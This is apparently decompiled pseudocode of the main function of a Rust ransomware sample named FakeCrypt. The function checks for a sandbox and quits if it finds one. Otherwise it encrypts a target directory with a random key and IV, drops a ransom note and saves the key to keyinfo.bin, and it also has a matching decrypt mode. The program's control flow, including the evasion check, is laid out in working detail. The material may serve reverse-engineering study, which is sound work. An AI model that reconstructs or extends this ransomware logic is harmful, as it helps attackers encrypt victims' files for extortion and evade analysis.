void _ZN9FakeCrypt4main17h8f6c4810655a0166E(void)

{
  undefined ***pppuVar1;
  undefined8 **ppuVar2;
  undefined8 **ppuVar3;
  undefined8 **ppuVar4;
  code *pcVar5;
  undefined5 uVar6;
  char cVar7;
  undefined4 uVar8;
  undefined8 uVar9;
  undefined4 *puVar10;
  undefined **ppuVar11;
  bool bVar12;
  undefined auVar13 [16];
  undefined ***local_168;
  undefined8 *local_160;
  undefined8 **local_158;
  code *pcStack_150;
  undefined8 local_148;
  undefined8 uStack_140;
  undefined **local_130;
  code *local_128;
  undefined8 *local_120;
  undefined local_118;
  undefined4 uStack_117;
  undefined4 uStack_113;
  undefined4 uStack_10f;
  undefined4 uStack_10b;
  undefined7 uStack_107;
  undefined uStack_100;
  undefined7 uStack_ff;
  undefined uStack_f8;
  undefined7 uStack_f7;
  undefined *local_68;
  undefined *puStack_60;
  undefined8 local_50 [2];
  undefined local_40 [8];
  undefined8 **local_38;
  long local_30;
  undefined8 **local_28;
  
  cVar7 = _ZN9FakeCrypt7stealth10is_sandbox17hafd329d2780dcab4E();
  if (cVar7 == '\0') {
    (*(code *)PTR__ZN3std3env4args17h2d42d299febd4730E_001deb60)(&local_118);
    _ZN4core4iter6traits8iterator8Iterator7collect17he4dd0fa351f6ca31E(local_40,&local_118);
    ppuVar4 = local_38;
    if (local_30 != 3) goto LAB_00154042;
    local_28 = local_38 + 6;
    pppuVar1 = (undefined ***)local_38[7];
    ppuVar2 = (undefined8 **)local_38[8];
                    /* try { // try from 00153afa to 00153b65 has its CatchHandler @ 001541c5 */
    _ZN3std2fs8metadata17h0760d7be52d610f8E(&local_118,pppuVar1,ppuVar2);
    uVar6 = CONCAT41(uStack_117,local_118);
    _ZN4core3ptr90drop_in_place_LT_core__result__Result_LT_std__fs__Metadata_C_std__io__error__Error_GT__GT_17h18de0bccda4629aaE
              (&local_118);
    if ((int)uVar6 == 2) {
LAB_00153fac:
      local_158 = &local_28;
      pcStack_150 = _ZN44__LT__RF_T_u20_as_u20_core__fmt__Display_GT_3fmt17h983fa18a9adfd763E;
      local_118 = 0x80;
      uStack_117 = 0x1d93;
      uStack_113 = 0x2000000;
      uStack_10f = 0;
      uStack_f8 = 0;
      uStack_f7 = 0;
      uStack_10b._3_1_ = (byte)&local_158;
      uStack_10b = (uint)uStack_10b._3_1_ << 0x18;
      uStack_107 = (undefined7)((ulong)&local_158 >> 8);
      uStack_100 = 1;
      uStack_ff = 0;
                    /* try { // try from 00153ff6 to 00154000 has its CatchHandler @ 001541c5 */
      (*(code *)PTR__ZN3std2io5stdio7_eprint17hc8807d5917a19629E_001deb90)(&local_118);
      goto LAB_0015417c;
    }
    cVar7 = (*(code *)PTR__ZN3std4path4Path6is_dir17hf801d9cfeb23f5dbE_001deb68)(pppuVar1,ppuVar2);
    if (cVar7 == '\0') goto LAB_00153fac;
    ppuVar3 = (undefined8 **)ppuVar4[4];
    ppuVar4 = (undefined8 **)ppuVar4[5];
    cVar7 = _ZN73__LT__u5b_A_u5d__u20_as_u20_core__slice__cmp__SlicePartialEq_LT_B_GT__GT_5equal17h4c5daeced03dccc4E
                      (ppuVar3,ppuVar4,&DAT_0010b0c9,7);
    if (cVar7 != '\0') {
      local_50[0] = (*(code *)PTR__ZN4rand4rngs6thread10thread_rng17h09fbc33fa767c893E_001deb70)();
      local_148 = 0;
      uStack_140 = 0;
      local_158 = (undefined8 **)0x0;
      pcStack_150 = (code *)0x0;
      local_68 = (undefined *)0x0;
      puStack_60 = (undefined *)0x0;
                    /* try { // try from 00153b83 to 00153c83 has its CatchHandler @ 001541a4 */
      _ZN4rand3rng3Rng4fill17h6622a59cfa54218dE(local_50,&local_158);
      _ZN4rand3rng3Rng4fill17hc443b30d36d1a142E(local_50,&local_68);
      local_160 = (undefined8 *)
                  PTR__ZN57__LT_std__path__Display_u20_as_u20_core__fmt__Display_GT_3fmt17h30f11f8aadf82eb7E_001deb78
      ;
      local_118 = 0xa0;
      uStack_117 = 0x1d93;
      uStack_113 = 0x2000000;
      uStack_10f = 0;
      uStack_f8 = 0;
      uStack_f7 = 0;
      uStack_10b._3_1_ = (byte)&local_168;
      uStack_10b = (uint)uStack_10b._3_1_ << 0x18;
      uStack_107 = (undefined7)((ulong)&local_168 >> 8);
      uStack_100 = 1;
      uStack_ff = 0;
      local_168 = &local_130;
      local_130 = (undefined **)pppuVar1;
      local_128 = (code *)ppuVar2;
      (*(code *)PTR__ZN3std2io5stdio6_print17h5b6764aa60c7b687E_001deb80)(&local_118);
      _ZN9FakeCrypt7fileops17encrypt_directory17hb6c6db8e2661d1b6E
                (pppuVar1,ppuVar2,&local_158,&local_68);
      local_118 = 0xc0;
      uStack_117 = 0x1d93;
      uStack_113 = 0x1000000;
      uStack_10f = 0;
      uStack_10b = 0x8000000;
      uStack_107 = 0;
      uStack_100 = 0;
      uStack_ff = 0;
      uStack_f8 = 0;
      uStack_f7 = 0;
      (*(code *)PTR__ZN3std2io5stdio6_print17h5b6764aa60c7b687E_001deb80)(&local_118);
      _ZN9FakeCrypt7fileops16drop_ransom_note17h4942ecd79881b15cE();
      _ZN3std2fs4File6create17h5c1de6a00e2586b5E(&local_118,"keyinfo.bin",0xb);
      uVar8 = _ZN4core6result19Result_LT_T_C_E_GT_6expect17hfc66c8e2754ad5d3E
                        (&local_118,"Failed to create key file",0x19,&PTR_s_src_main_rs_001d9518);
      local_168 = (undefined ***)CONCAT44(local_168._4_4_,uVar8);
                    /* try { // try from 00153c87 to 00153d32 has its CatchHandler @ 00154197 */
      uVar9 = _ZN3std2io5Write9write_all17h61cad997d75bad86E(&local_168,&local_158,0x20);
      _ZN4core6result19Result_LT_T_C_E_GT_6expect17hb04c0fd579f5cc61E
                (uVar9,"Failed to write key",0x13,&PTR_s_src_main_rs_001d9530);
      uVar9 = _ZN3std2io5Write9write_all17h61cad997d75bad86E(&local_168,&local_68,0x10);
      _ZN4core6result19Result_LT_T_C_E_GT_6expect17hb04c0fd579f5cc61E
                (uVar9,"Failed to write IV",0x12,&PTR_s_src_main_rs_001d9548);
      local_130 = &PTR_s_keyinfo_bin_001d9478;
      local_128 = _ZN44__LT__RF_T_u20_as_u20_core__fmt__Display_GT_3fmt17hc366d3db5c7a9bb3E;
      local_118 = 0xd0;
      uStack_117 = 0x1d93;
      uStack_113 = 0x2000000;
      uStack_10f = 0;
      uStack_f8 = 0;
      uStack_f7 = 0;
      uStack_10b._3_1_ = (byte)&local_130;
      uStack_10b = (uint)uStack_10b._3_1_ << 0x18;
      uStack_107 = (undefined7)((ulong)&local_130 >> 8);
      uStack_100 = 1;
      uStack_ff = 0;
      (*(code *)PTR__ZN3std2io5stdio6_print17h5b6764aa60c7b687E_001deb80)(&local_118);
      _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hfc222f4db551af96E((int)local_168);
                    /* try { // try from 00153d3b to 00153dbf has its CatchHandler @ 001541c5 */
      _ZN4core3ptr50drop_in_place_LT_rand__rngs__thread__ThreadRng_GT_17hb2ae31cd1a8c8c1aE(local_50)
      ;
LAB_00153f90:
      _ZN4core3ptr65drop_in_place_LT_alloc__vec__Vec_LT_alloc__string__String_GT__GT_17h454a48ed0cb28b12E
                (local_40);
      return;
    }
    cVar7 = _ZN73__LT__u5b_A_u5d__u20_as_u20_core__slice__cmp__SlicePartialEq_LT_B_GT__GT_5equal17h4c5daeced03dccc4E
                      (ppuVar3,ppuVar4,&DAT_0010b0d0,7);
    if (cVar7 != '\0') {
      local_158 = (undefined8 **)&PTR_s_keyinfo_bin_001d9478;
      pcStack_150 = _ZN44__LT__RF_T_u20_as_u20_core__fmt__Display_GT_3fmt17hc366d3db5c7a9bb3E;
      local_118 = 0xf0;
      uStack_117 = 0x1d93;
      uStack_113 = 0x2000000;
      uStack_10f = 0;
      uStack_f8 = 0;
      uStack_f7 = 0;
      uStack_10b._3_1_ = (byte)&local_158;
      uStack_10b = (uint)uStack_10b._3_1_ << 0x18;
      uStack_107 = (undefined7)((ulong)&local_158 >> 8);
      uStack_100 = 1;
      uStack_ff = 0;
      (*(code *)PTR__ZN3std2io5stdio6_print17h5b6764aa60c7b687E_001deb80)(&local_118);
      local_130 = (undefined **)0x0;
      local_128 = (code *)0x1;
      local_120 = (undefined ***)0x0;
                    /* try { // try from 00153ddb to 00153e0d has its CatchHandler @ 001541b6 */
      _ZN3std2fs4File4open17hfe7e6621c8fb380dE(&local_118,"keyinfo.bin",0xb);
      uVar8 = _ZN4core6result19Result_LT_T_C_E_GT_6expect17hfc66c8e2754ad5d3E
                        (&local_118,"Could not open key file",0x17,&PTR_s_src_main_rs_001d9488);
      local_158 = (undefined8 **)CONCAT44(local_158._4_4_,uVar8);
                    /* try { // try from 00153e12 to 00153e2f has its CatchHandler @ 00154189 */
      auVar13 = (*(code *)
                  PTR__ZN47__LT_std__fs__File_u20_as_u20_std__io__Read_GT_11read_to_end17h0619605a8d236003E_001deb88
                )(&local_158,&local_130);
      _ZN4core6result19Result_LT_T_C_E_GT_6expect17h6cf4cd195f2db86fE(auVar13._0_8_,auVar13._8_8_);
      _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hfc222f4db551af96E((int)local_158);
      if ((undefined ***)local_120 == (undefined ***)0x30) {
                    /* try { // try from 00153e4d to 00153f85 has its CatchHandler @ 001541b6 */
        auVar13 = _ZN106__LT_core__ops__range__Range_LT_usize_GT__u20_as_u20_core__slice__index__SliceIndex_LT__u5b_T_u5d__GT__GT_5index17h87c96b7bc7cc52f1E
                            (0,0x20,local_128,0x30,&PTR_s_src_main_rs_001d94b8);
        puVar10 = auVar13._0_8_;
        bVar12 = auVar13._8_8_ == 0x20;
        if (bVar12) {
          uStack_117 = *puVar10;
          uStack_113 = puVar10[1];
          uStack_10f = puVar10[2];
          uStack_10b = puVar10[3];
          uStack_107 = (undefined7)*(undefined8 *)(puVar10 + 4);
          uStack_100 = (undefined)((ulong)*(undefined8 *)(puVar10 + 4) >> 0x38);
          uStack_ff = (undefined7)*(undefined8 *)(puVar10 + 6);
          uStack_f8 = (undefined)((ulong)*(undefined8 *)(puVar10 + 6) >> 0x38);
        }
        local_118 = !bVar12;
        _ZN4core6result19Result_LT_T_C_E_GT_6unwrap17hdbcd3828175a306dE(&local_158,&local_118);
        auVar13 = _ZN106__LT_core__ops__range__Range_LT_usize_GT__u20_as_u20_core__slice__index__SliceIndex_LT__u5b_T_u5d__GT__GT_5index17h87c96b7bc7cc52f1E
                            (0x20,0x30,local_128,local_120,&PTR_s_src_main_rs_001d94e8);
        puVar10 = auVar13._0_8_;
        bVar12 = auVar13._8_8_ == 0x10;
        if (bVar12) {
          uStack_117 = *puVar10;
          uStack_113 = puVar10[1];
          uStack_10f = puVar10[2];
          uStack_10b = puVar10[3];
        }
        local_118 = !bVar12;
        _ZN4core6result19Result_LT_T_C_E_GT_6unwrap17hd6fa3a1b256db820E(local_50,&local_118);
        puStack_60 = 
        PTR__ZN57__LT_std__path__Display_u20_as_u20_core__fmt__Display_GT_3fmt17h30f11f8aadf82eb7E_001deb78
        ;
        local_118 = 0x30;
        uStack_117 = 0x1d94;
        uStack_113 = 0x2000000;
        uStack_10f = 0;
        uStack_f8 = 0;
        uStack_f7 = 0;
        uStack_10b._3_1_ = (byte)&local_68;
        uStack_10b = (uint)uStack_10b._3_1_ << 0x18;
        uStack_107 = (undefined7)((ulong)&local_68 >> 8);
        uStack_100 = 1;
        uStack_ff = 0;
        local_168 = pppuVar1;
        local_160 = ppuVar2;
        local_68 = (undefined *)&local_168;
        (*(code *)PTR__ZN3std2io5stdio6_print17h5b6764aa60c7b687E_001deb80)(&local_118);
        _ZN9FakeCrypt7fileops17decrypt_directory17h7bfbee2fc08c838dE
                  (pppuVar1,ppuVar2,&local_158,local_50);
        local_118 = 0x50;
        uStack_117 = 0x1d94;
        uStack_113 = 0x1000000;
        uStack_10f = 0;
        uStack_10b = 0x8000000;
        uStack_107 = 0;
        uStack_100 = 0;
        uStack_ff = 0;
        uStack_f8 = 0;
        uStack_f7 = 0;
        (*(code *)PTR__ZN3std2io5stdio6_print17h5b6764aa60c7b687E_001deb80)(&local_118);
                    /* try { // try from 00153f86 to 00153f8f has its CatchHandler @ 001541c5 */
        _ZN4core3ptr46drop_in_place_LT_alloc__vec__Vec_LT_u8_GT__GT_17h0777b7bfa8327074E(&local_130)
        ;
        goto LAB_00153f90;
      }
      local_168 = (undefined ***)local_120;
      pcStack_150 = (code *)
                    PTR__ZN4core3fmt3num3imp52__LT_impl_u20_core__fmt__Display_u20_for_u20_u64_GT_3fmt17h596da7382ae08600E_001deba0
      ;
      local_118 = 0x10;
      uStack_117 = 0x1d94;
      uStack_113 = 0x2000000;
      uStack_10f = 0;
      uStack_f8 = 0;
      uStack_f7 = 0;
      uStack_10b._3_1_ = (byte)&local_158;
      uStack_10b = (uint)uStack_10b._3_1_ << 0x18;
      uStack_107 = (undefined7)((ulong)&local_158 >> 8);
      uStack_100 = 1;
      uStack_ff = 0;
                    /* try { // try from 0015410f to 00154124 has its CatchHandler @ 001541b6 */
      local_158 = &local_168;
      (*(code *)PTR__ZN3std2io5stdio7_eprint17hc8807d5917a19629E_001deb90)(&local_118);
      (*(code *)PTR__ZN3std7process4exit17ha5a0456f3200bdd3E_001deb98)(1);
      goto LAB_00154187;
    }
    if (local_30 != 0) {
      local_158 = local_38;
      pcStack_150 = 
      _ZN60__LT_alloc__string__String_u20_as_u20_core__fmt__Display_GT_3fmt17h8e584e4fe4b805b4E;
      local_118 = 0x60;
      uStack_117 = 0x1d93;
      uStack_113 = 0x2000000;
      uStack_10f = 0;
      uStack_f8 = 0;
      uStack_f7 = 0;
      uStack_10b._3_1_ = (byte)&local_158;
      uStack_10b = (uint)uStack_10b._3_1_ << 0x18;
      uStack_107 = (undefined7)((ulong)&local_158 >> 8);
      uStack_100 = 1;
      uStack_ff = 0;
                    /* try { // try from 00154171 to 00154186 has its CatchHandler @ 001541c5 */
      (*(code *)PTR__ZN3std2io5stdio7_eprint17hc8807d5917a19629E_001deb90)(&local_118);
      goto LAB_0015417c;
    }
    ppuVar11 = &PTR_s_src_main_rs_001d9460;
  }
  else {
    local_118 = 0x50;
    uStack_117 = 0x1d93;
    uStack_113 = 0x1000000;
    uStack_10f = 0;
    uStack_10b = 0x8000000;
    uStack_107 = 0;
    uStack_100 = 0;
    uStack_ff = 0;
    uStack_f8 = 0;
    uStack_f7 = 0;
    (*(code *)PTR__ZN3std2io5stdio6_print17h5b6764aa60c7b687E_001deb80)(&local_118);
    local_30 = (*(code *)PTR__ZN3std7process4exit17ha5a0456f3200bdd3E_001deb98)(1);
LAB_00154042:
    if (local_30 != 0) {
      local_158 = local_38;
      pcStack_150 = 
      _ZN60__LT_alloc__string__String_u20_as_u20_core__fmt__Display_GT_3fmt17h8e584e4fe4b805b4E;
      local_118 = 0x60;
      uStack_117 = 0x1d93;
      uStack_113 = 0x2000000;
      uStack_10f = 0;
      uStack_f8 = 0;
      uStack_f7 = 0;
      uStack_10b._3_1_ = (byte)&local_158;
      uStack_10b = (uint)uStack_10b._3_1_ << 0x18;
      uStack_107 = (undefined7)((ulong)&local_158 >> 8);
      uStack_100 = 1;
      uStack_ff = 0;
                    /* try { // try from 0015409a to 001540c5 has its CatchHandler @ 001541c5 */
      (*(code *)PTR__ZN3std2io5stdio7_eprint17hc8807d5917a19629E_001deb90)(&local_118);
LAB_0015417c:
      (*(code *)PTR__ZN3std7process4exit17ha5a0456f3200bdd3E_001deb98)(1);
      goto LAB_00154187;
    }
    ppuVar11 = &PTR_s_src_main_rs_001d9560;
  }
  (*(code *)PTR__ZN4core9panicking18panic_bounds_check17h9181a23875c77293E_001dea70)(0,0,ppuVar11);
LAB_00154187:
                    /* WARNING: Does not return */
  pcVar5 = (code *)invalidInstructionException();
  (*pcVar5)();
}